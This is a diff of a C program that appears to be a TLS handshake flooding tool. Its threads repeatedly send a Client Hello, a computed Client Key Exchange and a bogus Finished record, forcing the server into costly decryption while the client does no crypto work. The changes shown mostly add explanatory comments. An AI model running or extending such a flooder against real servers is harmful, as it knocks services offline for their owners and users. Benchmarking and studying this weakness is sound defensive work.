@@ -68,12 +68,8 @@ unsigned char client_hello[] = {
   0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d,
   0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14,
   0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b,
-  /* No session ID */
-  0x00,
-  /* Cipher suite */
-  0x00, 0x02, 0x00, 0x01,
-  /* Compression method */
-  0x01, 0x00
+  /* No session ID, cipher suite nor compression method */
+  0x00, 0x00, 0x02, 0x00, 0x01, 0x01, 0x00
 };
 
 int len_client_key_exchange;
@@ -101,6 +97,7 @@ unsigned char client_finished[] = {
   0x8e, 0x2a, 0x21, 0x92
 };
 
+/* Solve host and port */
 static struct addrinfo *
 solve(const char *host, const char *port) {
   int              err;
@@ -125,6 +122,7 @@ solve(const char *host, const char *port) {
   return result;
 }
 
+/* Send Client Hello */
 static void
 send_client_hello(int s) {
   if (write(s, client_hello,
@@ -132,6 +130,8 @@ send_client_hello(int s) {
     fail("Unable to send Client Hello:\n%m");
 }
 
+/* Send Client Key Exchange, Change Cipher Spec and a bogus Client
+ * Finished record. */
 static void
 send_client_end(int s) {
   struct iovec msg[3] = {
@@ -145,6 +145,8 @@ send_client_end(int s) {
     fail("Unable to send end message:\n%m");
 }
 
+/* Receive Server Hello, Certificate and Server Hello Done. Will parse
+ * the certificate if `quick` is not set to 1. */
 static X509*
 receive_server_hello(int s, int quick) {
   u_int16_t      l, r, m;
@@ -238,6 +240,8 @@ receive_server_hello(int s, int quick) {
   return cert;
 }
 
+/* From server certificate, complete Client Key Exchange TLS record so
+ * that the server can validate it. */
 static void
 can_client_keyexchange(X509 *cert) {
   start("Build Client Key Exchange message");
@@ -278,9 +282,9 @@ can_client_keyexchange(X509 *cert) {
   len_client_key_exchange = n + 9;
 }
 
-pthread_mutex_t lock;
-int handshakes = 0;
-
+/* Handle statistics from threads. */
+pthread_mutex_t lock;		/* Lock to access `handshakes` */
+int handshakes = 0;		/* Number of handshakes done */
 static void*
 statistics(void *arg) {
   int old = 0;
@@ -291,13 +295,15 @@ statistics(void *arg) {
     r = handshakes - old;
     old = handshakes;
     pthread_mutex_unlock(&lock);
-    if (r < 0)
+    if (r < 0)			/* Overflow */
       continue;
-    end("%d handshakes/s", r);
+    end("%d handshakes/s", r);	/* Not really accurate, but... */
   }
   return NULL;
 }
 
+/* Thread that will send in loop incomplete handshakes. 100%
+ * guaranteed without any crypto operation */
 static void*
 run(void *arg) {
   struct addrinfo *target = arg;
@@ -315,7 +321,12 @@ run(void *arg) {
       continue;
     }
     send_client_hello(s);
-    receive_server_hello(s, 1);
+    receive_server_hello(s, 1);	/* You may try to comment this out but
+				 * it does not seem to work... Window
+				 * seems to small. You could replace
+				 * by a read() but you may need more
+				 * than one and to know this, you need
+				 * to parse the content... */
     send_client_end(s);
     close(s);
     pthread_mutex_lock(&lock);
